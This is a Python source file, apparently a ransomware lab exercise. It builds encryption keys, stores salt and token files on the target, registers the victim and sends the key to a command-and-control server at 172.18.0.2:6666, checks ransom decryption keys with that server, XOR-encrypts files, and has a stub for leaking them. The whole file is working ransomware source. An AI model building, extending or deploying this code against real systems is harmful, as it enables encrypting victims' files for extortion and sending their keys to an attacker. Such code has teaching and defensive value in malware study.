from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        """
         key and the salt derivation
        """

        # First, salt derivation
        # Use of the "token_bytes" function from the secret class 
        # which generate a random bytes string 
        salt_derivate = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.SALT_LENGTH,
            salt= secrets.token_bytes(16), 
            iterations=self.ITERATION,
        )

        new_salt = salt_derivate.derive(salt)
    
        #Then, key derivation with the previous salt derivation 
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.TOKEN_LENGTH,
            salt=new_salt,
            iterations=self.ITERATION,
        )

        new_key = kdf.derive(key)
        return new_key, new_salt



    def create(self)->Tuple[bytes, bytes, bytes]:
        """
         Create a tuple compose of a random key, a random salt, and the token
        """
        # Use of the 'token_bytes' function in order to generate 
        # a random key and salt 

        self._token = secrets.token_bytes(16)
        response = {
            "key": secrets.token_bytes(16),
            "salt": secrets.token_bytes(16),
            "token": self._token
        }
        return response


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        """
         Register the victim to the CNC
        """
        # Json format does not support bytes so we use the "bin_to_64" method
        
        payload = {
            "token" : self.bin_to_b64(token),
            "salt" : self.bin_to_b64(salt),
            "key" : self.bin_to_b64(key)
        }
        requests.post("http://172.18.0.2:6666/new", json=payload)

        # Without the "new" at the end of the url, the request is not allowed 
        # We find the IP address of the CNC server thanks to the command :
        # 'sudo docker inspect ransomware-network'

    def setup(self)->None:
        """ 
         Main function to create crypto data and register malware to cnc
        """

        tokens = self.create()
        self._key, self._salt = self.do_derivation(tokens["salt"],tokens["key"])
        self._token = tokens["token"]

        # Creation of the salt and token folder on the target's system
        folder_name = "/root/tokens"
        os.makedirs(folder_name, exist_ok=True)

        with open(folder_name + "/salt.bin", "wb") as file:
            file.write(self._salt)

        with open(folder_name+'/token.bin','wb') as file:
            file.write(self._token)

        # Send the crypto elements to the CNC
        self.post_new(self._salt, self._key, self._token)
        

    def load(self)->None:
        """
         Function to load crypto data
        """

        folder_name = "/root/tokens"
        with open(folder_name + "/salt.bin", "rb") as file:
            self._salt = file.read()

        with open(folder_name+'/token.bin','rb') as file:
            self._token = file.read()

    def check_key(self, candidate_key:bytes)->bool:
        """
         Assert the key is valid
        """
        
        token = self.get_hex_token()
        payload = {
            "token": token,
            "key":self.bin_to_b64(candidate_key)
        }

        check_candidate = requests.post("http://172.18.0.2:6666/key", json=payload)
        check_response = check_candidate.json()

        if check_response["valide"]==1:
            return True
        else:
            return False

    def set_key(self, b64_key:str)->None:
        """
         If the key is valid, set the self._key var for decrypting
        """

        key = base64.decode(b64_key)
        check_error_key = self.check_key(key)
        if check_error_key == True:
            self._key = key
        else:
            raise KeyError
        return

    def get_hex_token(self)->str:
        """
         Return a string composed of hex symbole, regarding the token
        """

        hex_token = ""
        with open('/root/tokens/token.bin', 'rb') as file:
            hex_token = file.read()
        
        hex_token = hex_token.hex()
        return hex_token

    def xorfiles(self, files:List[str])->None :
        """
         XOR a list for file
        """

        files_encrypted = {}
        for file in files:
            files_encrypted[str(file)] = xorfile(file, self._key)


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        """
         Remove crypto data from the target
        """

        folder_name = "/root/tokens"
        os.remove(folder_name+"/salt.bin")
        os.remove(folder_name + '/token.bin')
        
        self._key = None
        self._salt = None
        self._token = None

        

        